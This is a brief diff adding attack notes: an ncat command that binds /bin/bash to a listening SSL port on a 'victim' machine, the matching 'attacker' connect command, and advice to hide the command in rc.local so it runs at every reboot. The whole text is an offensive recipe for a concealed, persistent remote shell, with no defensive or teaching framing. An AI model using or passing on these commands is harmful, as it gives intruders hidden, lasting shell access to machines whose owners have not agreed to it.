@@ -1,0 +1,5 @@
+Victim: ncat -vnlp 192.168.1.19 1234 -e /bin/bash --ssl
+Attacker: ncat -nv 192.168.1.19 1234 --ssl
+
+Best way to hide the command is just to hide it in rc.local. Every times the machine get restarted, the command is supposed to be executed.
+Better if we use some bash script to perform it better.
